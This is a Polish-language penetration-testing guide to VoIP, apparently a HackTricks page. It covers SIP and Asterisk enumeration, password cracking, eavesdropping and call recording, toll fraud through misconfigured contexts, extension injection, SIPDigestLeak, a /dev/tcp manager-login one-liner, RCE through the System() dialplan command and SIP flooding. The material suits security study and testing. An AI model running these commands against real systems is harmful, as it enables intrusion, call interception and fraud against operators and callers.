# Testowanie penetracyjne VoIP

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>

## Podstawowe informacje o VoIP

Aby zacząć uczyć się, jak działa VoIP, sprawdź:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Wyliczanie VoIP

### Numery telefonów

Jednym z pierwszych kroków, które może podjąć Red Team, jest wyszukiwanie dostępnych numerów telefonów do kontaktu z firmą za pomocą narzędzi OSINT, wyszukiwarek Google lub przeszukiwania stron internetowych.

Po uzyskaniu numerów telefonów można użyć usług online do identyfikacji operatora:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Dzięki informacji, czy operator świadczy usługi VoIP, można zidentyfikować, czy firma korzysta z VoIP... Ponadto możliwe jest, że firma nie zatrudniła usług VoIP, ale korzysta z kart PSTN do podłączenia własnej centrali VoIP do tradycyjnej sieci telefonicznej.

Rzeczy takie jak automatyczne odpowiedzi lub muzyka zwykle wskazują na korzystanie z VoIP. 

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informacje OSINT

Jakiekolwiek inne narzędzia OSINT, które pomogą zidentyfikować używane oprogramowanie VoIP, będą przydatne dla Red Teamu.

### Wyliczanie sieci

* **`nmap`** jest zdolny do skanowania usług UDP, ale ze względu na ilość skanowanych usług UDP, jest bardzo wolny i może nie być zbyt dokładny w przypadku tego rodzaju usług.
* **`svmap`** z SIPVicious (`sudo apt install sipvicious`): Zlokalizuje usługi SIP w podanej sieci.
* `svmap` jest **łatwy do zablokowania**, ponieważ używa User-Agenta `friendly-scanner`, ale można zmodyfikować kod z `/usr/share/sipvicious/sipvicious` i go zmienić.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan to bardzo szybkie narzędzie do skanowania usług SIP przez UDP, TCP lub TLS. Wykorzystuje wielowątkowość i może skanować duże zakresy sieci. Pozwala łatwo określić zakres portów, skanować zarówno TCP, jak i UDP, używać innej metody (domyślnie używa OPTIONS) oraz określać inny User-Agent (i więcej).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit jest jednym z najpopularniejszych narzędzi do testowania penetracyjnego, które jest szeroko stosowane w środowiskach VoIP. Metasploit zapewnia wiele modułów i exploitów, które mogą być wykorzystane do atakowania i testowania zabezpieczeń systemów VoIP. Narzędzie to umożliwia również automatyzację procesu testowania penetracyjnego, co przyspiesza proces identyfikacji podatności i ich wykorzystania. Metasploit jest niezwykle potężnym narzędziem, które może być wykorzystane zarówno przez hakerów, jak i przez profesjonalistów ds. bezpieczeństwa do testowania i zabezpieczania systemów VoIP.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatkowe wyliczanie sieciowe

PBX może również ujawniać inne usługi sieciowe, takie jak:

* **69/UDP (TFTP)**: Aktualizacje oprogramowania
* **80 (HTTP) / 443 (HTTPS)**: Zarządzanie urządzeniem za pomocą sieci
* **389 (LDAP)**: Alternatywne przechowywanie informacji o użytkownikach
* **3306 (MySQL**): Baza danych MySQL
* **5038 (Manager)**: Umożliwia korzystanie z Asterisk z innych platform
* **5222 (XMPP)**: Wiadomości za pomocą Jabbera
* **5432 (PostgreSQL)**: Baza danych PostgreSQL
* I inne...

### Wyliczanie metod

Można znaleźć **dostępne metody** do użycia w PBX za pomocą `sipenumerate.py` z [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Wyliczanie rozszerzeń

Rozszerzenia w systemie PBX (Private Branch Exchange) odnoszą się do **unikalnych wewnętrznych identyfikatorów przypisanych do poszczególnych** linii telefonicznych, urządzeń lub użytkowników w organizacji lub firmie. Rozszerzenia umożliwiają **efektywne przekierowywanie połączeń wewnątrz organizacji**, bez konieczności posiadania indywidualnych zewnętrznych numerów telefonów dla każdego użytkownika lub urządzenia.

* **`svwar`** z SIPVicious (`sudo apt install sipvicious`): `svwar` to darmowe narzędzie do skanowania linii rozszerzeń SIP PBX. W koncepcji działa podobnie do tradycyjnych wardialerów, **próbuje zgadywać zakres rozszerzeń lub podaną listę rozszerzeń**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identyfikuje rozszerzenia na serwerze SIP. Sipexten może sprawdzać duże sieci i zakresy portów.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Możesz również wyliczać rozszerzenia/nazwy użytkowników za pomocą metasploita:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** to narzędzie do **przełamywania haseł metodą brute-force** dla protokołu Inter Asterisk Exchange (IAX). enumIAX może działać w dwóch różnych trybach: Sekwencyjne Próby Odgadywania Nazwy Użytkownika lub Atak Słownikowy.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataki na VoIP

### Brute Force hasła

Po odkryciu **PBX** i niektórych **rozszerzeń/nazw użytkowników**, Zespół Czerwony może spróbować **uwierzytelnić się za pomocą metody `REGISTER`** do rozszerzenia, używając słownika popularnych haseł do przeprowadzenia ataku brute force na uwierzytelnienie.

{% hint style="danger" %}
Należy zauważyć, że **nazwa użytkownika** może być taka sama jak rozszerzenie, ale ta praktyka może się różnić w zależności od systemu PBX, jego konfiguracji i preferencji organizacji...

Jeśli nazwa użytkownika nie jest taka sama jak rozszerzenie, będziesz musiał **ustalić nazwę użytkownika, aby przeprowadzić atak brute force**.
{% endhint %}

* **`svcrack`** z SIPVicious (`sudo apt install sipvicious`): SVCrack pozwala na złamanie hasła dla określonej nazwy użytkownika/rozszerzenia na PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack to narzędzie do łamania uwierzytelnienia Digest w protokole SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Podsłuchiwanie VoIP

Jeśli znajdziesz sprzęt VoIP w **otwartej sieci Wi-Fi**, możesz **podsluchać wszystkie informacje**. Ponadto, jeśli jesteś w bardziej zamkniętej sieci (podłączony przez Ethernet lub chronioną sieć Wi-Fi), możesz przeprowadzić ataki **MitM, takie jak** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) między **PBX a bramką** w celu podsłuchiwania informacji.

Wśród informacji sieciowych możesz znaleźć **dane uwierzytelniające do zarządzania sprzętem**, **rozszerzenia użytkowników**, **nazwy użytkowników**, **adresy IP**, nawet **zaszyfrowane hasła** i **pakiety RTP**, które można odtworzyć, aby **słuchać rozmowy**, i wiele więcej.

Aby uzyskać te informacje, możesz użyć narzędzi takich jak Wireshark, tcpdump... ale **specjalnie stworzone narzędzie do podsłuchiwania rozmów VoIP to** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Zauważ, że jeśli **w komunikacji SIP używane jest TLS**, nie będziesz w stanie zobaczyć komunikacji SIP w czystej postaci.\
To samo będzie miało miejsce, jeśli używane są **SRTP** i **ZRTP**, **pakiety RTP nie będą w czystym tekście**.
{% endhint %}

#### Dane uwierzytelniające SIP

[Sprawdź ten przykład, aby lepiej zrozumieć **komunikację SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) i dowiedz się, jak są **wysyłane dane uwierzytelniające**.

* **`sipdump`** & **`sipcrack`,** część **sipcrack** (`apt-get install sipcrack`): Te narzędzia mogą **wydobyć** z **pcap** **uwierzytelnienia digest** w protokole SIP i **przeprowadzić atak bruteforce** na nie.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** wyodrębnia dane protokołu SIP z pliku PCAP.
* **SipDump** wyodrębnia uwierzytelnienia SIP Digest z pliku PCAP.
* **SIP Digest Crack** to narzędzie do łamania uwierzytelnienia Digest w protokole SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### Kody DTMF

Nie tylko dane uwierzytelniające SIP mogą być znalezione w ruchu sieciowym, możliwe jest również znalezienie kodów DTMF, które są używane na przykład do dostępu do poczty głosowej.\
Możliwe jest wysłanie tych kodów w wiadomościach SIP INFO, w formacie audio lub wewnątrz pakietów RTP. Jeśli kody znajdują się w pakietach RTP, można je wyciąć z tej części rozmowy i użyć narzędzia multimo do ich wyodrębnienia:
```bash
multimon -a DTMF -t wac pin.wav
```
### Darmowe połączenia / Błędy konfiguracji połączeń Asterisk

W Asterisku istnieje możliwość zezwolenia na połączenie **z określonego adresu IP** lub z **dowolnego adresu IP**:
```
host=10.10.10.10
host=dynamic
```
Jeśli podany jest adres IP, host **nie będzie musiał wysyłać żądań REGISTER** co jakiś czas (w pakiecie REGISTER wysyłany jest czas życia, zazwyczaj 30 minut, co oznacza, że w innym scenariuszu telefon będzie musiał się REJESTROWAĆ co 30 minut). Jednakże, musi mieć otwarte porty umożliwiające połączenia z serwerem VoIP w celu odbierania połączeń.

Aby zdefiniować użytkowników, można ich zdefiniować jako:

* **`type=user`**: Użytkownik może tylko odbierać połączenia jako użytkownik.
* **`type=friend`**: Możliwe jest wykonywanie połączeń jako peer i odbieranie ich jako użytkownik (używane z rozszerzeniami).
* **`type=peer`**: Możliwe jest wysyłanie i odbieranie połączeń jako peer (SIP-trunks).

Możliwe jest również ustanowienie zaufania za pomocą zmiennej insecure:

* **`insecure=port`**: Umożliwia połączenia peer, które są uwierzytelniane przez IP.
* **`insecure=invite`**: Nie wymaga uwierzytelniania dla wiadomości INVITE.
* **`insecure=port,invite`**: Oba.

{% hint style="warning" %}
Kiedy używane jest **`type=friend`**, **wartość** zmiennej **host** **nie będzie używana**, więc jeśli administrator **błędnie skonfiguruje SIP-trunk** używając tej wartości, **każdy będzie mógł się do niego podłączyć**.

Na przykład, taka konfiguracja byłaby podatna na ataki:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Darmowe połączenia / Błędy konfiguracji kontekstu w Asterisk

W Asterisku **kontekst** to nazwany kontener lub sekcja w planie wybierania, który **grupuje powiązane rozszerzenia, akcje i reguły**. Plan wybierania jest podstawowym komponentem systemu Asterisk, ponieważ definiuje **sposób obsługi i kierowania przychodzących i wychodzących połączeń**. Konteksty są używane do organizacji planu wybierania, zarządzania kontrolą dostępu i zapewnienia separacji między różnymi częściami systemu.

Każdy kontekst jest zdefiniowany w pliku konfiguracyjnym, zwykle w pliku **`extensions.conf`**. Konteksty są oznaczane przez nawiasy kwadratowe, a nazwa kontekstu jest zamknięta w nich. Na przykład:
```bash
csharpCopy code[my_context]
```
W kontekście definiuje się rozszerzenia (wzorce numerów wybieranych) i przypisuje im szereg działań lub aplikacji. Te działania określają, w jaki sposób jest przetwarzane połączenie. Na przykład:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ten przykład przedstawia prosty kontekst o nazwie "my\_context" z rozszerzeniem "100". Gdy ktoś wybierze numer 100, połączenie zostanie odebrane, odtworzony zostanie komunikat powitalny, a następnie połączenie zostanie zakończone.

To jest **inny kontekst**, który umożliwia **wybieranie dowolnego innego numeru**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Jeśli administrator definiuje **domyślny kontekst** jako:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Każdy będzie mógł używać **serwera do dzwonienia na dowolny numer** (a administrator serwera będzie płacił za połączenie).
{% endhint %}

{% hint style="danger" %}
Co więcej, domyślnie plik **`sip.conf`** zawiera **`allowguest=true`**, więc **dowolny** atakujący **bez uwierzytelnienia** będzie mógł dzwonić na dowolny numer.
{% endhint %}

*   **`sipinvite.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite sprawdza, czy serwer PBX pozwala nam na wykonywanie połączeń bez uwierzytelnienia. Jeśli serwer SIP ma nieprawidłową konfigurację, pozwoli nam na wykonywanie połączeń do zewnętrznych numerów. Może również umożliwić nam przekierowanie połączenia na drugi zewnętrzny numer.

Na przykład, jeśli twój serwer Asterisk ma złą konfigurację kontekstu, możesz akceptować żądania INVITE bez autoryzacji. W tym przypadku atakujący może dzwonić, nie znając żadnego użytkownika/hasła.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Darmowe połączenia / Źle skonfigurowane IVRS

IVRS oznacza **Interactive Voice Response System**, technologię telefoniczną, która umożliwia użytkownikom interakcję z zautomatyzowanym systemem za pomocą głosu lub klawiszy. IVRS służy do budowy **automatycznych systemów obsługi połączeń**, które oferują różne funkcje, takie jak udzielanie informacji, kierowanie połączeń i zbieranie danych od użytkowników.

Typowy system IVRS w systemach VoIP składa się z:

1. **Komunikatów głosowych**: Wstępnie nagranych wiadomości audio, które prowadzą użytkowników przez opcje i instrukcje menu IVR.
2. **Sygnalizacji DTMF** (Dual-Tone Multi-Frequency): Sygnały generowane przez naciśnięcie klawiszy na telefonie, które służą do nawigacji po menu IVR i wprowadzania danych.
3. **Kierowania połączeń**: Przekierowywanie połączeń do odpowiedniego miejsca, takiego jak konkretne działy, agenci lub numery wewnętrzne, na podstawie danych wprowadzonych przez użytkownika.
4. **Zbierania danych od użytkowników**: Pobieranie informacji od dzwoniących, takich jak numery kont, identyfikatory spraw lub inne istotne dane.
5. **Integracji z systemami zewnętrznymi**: Połączenie systemu IVR z bazami danych lub innymi systemami oprogramowania w celu uzyskiwania dostępu do informacji, aktualizacji danych, wykonywania działań lub wywoływania zdarzeń.

W systemie Asterisk VoIP można utworzyć IVR za pomocą planu wybierania (**plik `extensions.conf`**) i różnych aplikacji, takich jak `Background()`, `Playback()`, `Read()` i inne. Te aplikacje umożliwiają odtwarzanie komunikatów głosowych, zbieranie danych od użytkowników i kontrolowanie przepływu połączenia.

#### Przykład podatnej konfiguracji
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Poprzedni przykład pokazuje, że użytkownik jest proszony o **naciśnięcie 1, aby zadzwonić** do jednego działu, **2, aby zadzwonić** do innego działu, lub **pełny numer wewnętrzny**, jeśli go zna.\
Podatność polega na tym, że **nie jest sprawdzana długość podanego numeru wewnętrznego, więc użytkownik może wprowadzić pełny numer wewnętrzny w czasie 5 sekund i zostanie on wybrany.**

### Wstrzyknięcie numeru wewnętrznego

Używając numeru wewnętrznego, takiego jak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gdzie **`${EXTEN}`** to **numer wewnętrzny**, który zostanie wybrany, gdy zostanie wprowadzone **ext 101**, oto co by się stało:
```scss
exten => 101,1,Dial(SIP/101)
```
Jednakże, jeśli **`${EXTEN}`** pozwala na wprowadzanie **czegoś innego niż liczby** (jak w starszych wersjach Asteriska), atakujący mógłby wprowadzić **`101&SIP123123123`** aby zadzwonić pod numer telefonu 123123123. A to byłby wynik:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Dlatego też, połączenie do rozszerzenia **`101`** i **`123123123`** zostanie wysłane i tylko pierwsze z nich, które otrzyma połączenie, zostanie nawiązane... ale jeśli atakujący użyje **rozszerzenia, które omija dopasowanie** i nie istnieje, może **wstrzyknąć połączenie tylko do wybranego numeru**.

## SIPDigestLeak

SIP Digest Leak to podatność, która dotyczy dużej liczby telefonów SIP, w tym zarówno sprzętowych, jak i oprogramowania IP, a także adapterów telefonicznych (VoIP do analogowego). Podatność ta umożliwia **wyciek odpowiedzi uwierzytelniania Digest**, która jest obliczana na podstawie hasła. Następnie możliwy jest **atak offline na hasło**, który pozwala odzyskać większość haseł na podstawie odpowiedzi na wyzwanie.

**[Scenariusz podatności odnajdziesz tutaj**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Telefon IP (ofiara) nasłuchuje na porcie 5060 i akceptuje połączenia telefoniczne.
2. Atakujący wysyła INVITE do telefonu IP.
3. Telefon ofiary zaczyna dzwonić, a ktoś odbiera i rozłącza się (ponieważ nikt nie odbiera telefonu po drugiej stronie).
4. Po rozłączeniu telefon ofiary wysyła BYE do atakującego.
5. Atakujący wysyła odpowiedź 407, która **wymaga uwierzytelnienia** i wywołuje wyzwanie uwierzytelniania.
6. Telefon ofiary odpowiada na wyzwanie uwierzytelniania w drugim BYE.
7. Atakujący może wtedy przeprowadzić atak brute-force na odpowiedź na wyzwanie na swoim lokalnym komputerze (lub w sieci rozproszonej itp.) i zgadnąć hasło.

* **sipdigestleak.py** z [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak wykorzystuje tę podatność.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call umożliwia **użytkownikowi sieci web** (który na przykład może być zainteresowany produktem) **wprowadzenie** swojego **numeru telefonu** w celu otrzymania połączenia. Następnie zostanie wykonane połączenie z reklamą, a gdy użytkownik **odezwie się przez telefon**, zostanie **połączony z agentem**.

Wspólny profil Asterisk dla tego celu to:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Poprzedni profil umożliwia **POŁĄCZENIE Z KAŻDYM ADRESEM IP** (jeśli znane jest hasło).
* Aby **zorganizować połączenie**, jak wcześniej określono, **nie jest wymagane uprawnienie do odczytu**, a jedynie uprawnienie do **tworzenia** w trybie **zapisu**.

Z tymi uprawnieniami każde IP, znając hasło, mogłoby się połączyć i wydobyć zbyt wiele informacji, takich jak:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Więcej informacji lub działań może być wymaganych.**

### **Podsluchiwanie**

W Asterisku możliwe jest użycie polecenia **`ChanSpy`**, wskazującego **rozszerzenie(y) do monitorowania** (lub wszystkie), aby podsłuchać rozmowy, które się odbywają. To polecenie musi być przypisane do rozszerzenia.

Na przykład, **`exten => 333,1,ChanSpy('all',qb)`** oznacza, że jeśli **zadzwonisz** na **rozszerzenie 333**, będzie ono **monitorować** **`wszystkie`** rozszerzenia, **rozpoczynając nasłuchiwanie** za każdym razem, gdy rozpocznie się nowa rozmowa (**`b`**) w trybie cichym (**`q`**), ponieważ nie chcemy na nią wpływać. Możesz przejść z jednej trwającej rozmowy do drugiej, naciskając **`*`**, lub oznaczając numer rozszerzenia.

Możliwe jest również użycie **`ExtenSpy`**, aby monitorować tylko jedno rozszerzenie.

Zamiast słuchać rozmów, można je **nagrywać w plikach** za pomocą rozszerzenia, takiego jak:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Połączenia zostaną zapisane w **`/tmp`**.

Możesz nawet zmusić Asterisk do **wykonania skryptu, który ujawni połączenie** po jego zamknięciu.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** to poważny problem związany z bezpieczeństwem, który dotyczy serwerów VoIP opartych na Asterisku (opublikowany w 2017 roku). Podatność ta umożliwia **przechwycenie i przekierowanie ruchu RTP (Real Time Protocol)**, który przenosi rozmowy VoIP, przez dowolną osobę w Internecie. Dzieje się tak, ponieważ ruch RTP omija uwierzytelnianie podczas przechodzenia przez zapory NAT (Network Address Translation).

Proksy RTP próbują rozwiązać **ograniczenia NAT** wpływające na systemy RTC, przekazując strumienie RTP między dwiema lub więcej stronami. Gdy NAT jest w użyciu, oprogramowanie proxy RTP często nie może polegać na informacjach o adresie IP i porcie RTP pobranych za pomocą sygnalizacji (np. SIP). Dlatego wiele proxy RTP wprowadziło mechanizm, w którym takie **krotki IP i portu są automatycznie poznawane**. Często jest to realizowane poprzez analizę przychodzącego ruchu RTP i oznaczanie adresu IP i portu źródłowego dla każdego przychodzącego ruchu RTP jako adresu, na który należy odpowiedzieć. Ten mechanizm, który może być nazywany "trybem nauki", **nie wykorzystuje żadnej formy uwierzytelniania**. Dlatego **atakujący** mogą **wysyłać ruch RTP do proxy RTP** i otrzymywać ruch RTP przekazywany do prawowitych użytkowników rozmowy RTP. Nazywamy tę podatność RTP Bleed, ponieważ umożliwia atakującym otrzymywanie strumieni multimedialnych RTP, które są przeznaczone dla prawowitych użytkowników.

Innym interesującym zachowaniem proxy RTP i stosów RTP jest to, że czasami, **nawet jeśli nie są podatne na RTP Bleed**, akceptują, przekazują i/lub przetwarzają pakiety RTP z dowolnego źródła. Dlatego atakujący mogą wysyłać pakiety RTP, które pozwalają im wstrzykiwać swoje dane multimedialne zamiast prawowitych. Nazywamy ten atak wstrzykiwaniem RTP, ponieważ umożliwia wstrzykiwanie nieprawowitych pakietów RTP do istniejących strumieni RTP. Ta podatność może występować zarówno w proxy RTP, jak i w punktach końcowych.

Asterisk i FreePBX tradycyjnie używają ustawienia **`NAT=yes`**, które umożliwia omijanie uwierzytelniania ruchu RTP, co potencjalnie prowadzi do braku dźwięku lub jednostronnego dźwięku podczas rozmów.

Więcej informacji można znaleźć na stronie [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykrywa podatność RTP Bleed, wysyłając strumienie RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykrywa podatność na wyciek RTP, wysyłając strumienie RTP
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykorzystuje podatność RTP Bleed, wysyłając strumienie RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykorzystuje podatność RTP Bleed, wysyłając strumienie RTP (z pliku audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

W Asterisku w jakiś sposób udaje ci się **dodać reguły rozszerzeń i je przeładować** (na przykład poprzez skompromitowanie podatnego serwera zarządzającego siecią), możliwe jest uzyskanie RCE za pomocą polecenia **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Istnieje polecenie o nazwie **`Shell`**, które można użyć **zamiast `System`** do wykonania poleceń systemowych, jeśli jest to konieczne.

{% hint style="warning" %}
Jeśli serwer **nie zezwala na użycie pewnych znaków** w poleceniu **`System`** (jak w przypadku Elastix), sprawdź, czy serwer sieciowy pozwala na **tworzenie plików w systemie** (jak w przypadku Elastix lub trixbox) i użyj go do **utworzenia skryptu backdoor** a następnie użyj **`System`** do **wykonania** tego **skryptu**.
{% endhint %}

#### Interesujące lokalne pliki i uprawnienia

* **`sip.conf`** -> Zawiera hasło użytkowników SIP.
* Jeśli serwer **Asterisk działa jako root**, można przejąć kontrolę nad rootem.
* **Użytkownik root mysql** może **nie mieć hasła**.
* Może to być wykorzystane do utworzenia nowego użytkownika mysql jako backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Zawiera hasło administratora panelu sieciowego (FreePBX).
* **`FreePBX.conf`** -> Zawiera hasło użytkownika FreePBXuser używane do dostępu do bazy danych.
* Może to być wykorzystane do utworzenia nowego użytkownika mysql jako backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Zawiera kilka haseł w postaci zwykłego tekstu, takich jak hasło root mysql, hasło IMAPd, hasło administratora sieciowego.
* **Kilka folderów** będzie należeć do skompromitowanego użytkownika asterisk (jeśli nie działa jako root). Ten użytkownik może odczytywać wcześniejsze pliki i kontrolować konfigurację, więc może spowodować, że Asterisk załaduje inne binarne pliki backdoorowane podczas wykonywania.

### Wstrzykiwanie RTP

Możliwe jest wstrzyknięcie pliku **`.wav`** do rozmów za pomocą narzędzi takich jak **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Lub można użyć skryptów z [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) do **skanowania rozmów** (**`rtpscan.pl`**), wysyłania `.wav` do rozmowy (**`rtpsend.pl`**) i **wstrzykiwania hałasu** do rozmowy (**`rtpflood.pl`**).

### Ataki typu DoS

Istnieje kilka sposobów próby przeprowadzenia ataku typu DoS na serwery VoIP.

* **`sipflood.py`** z [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ wysyła nieograniczoną liczbę wiadomości do celu
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
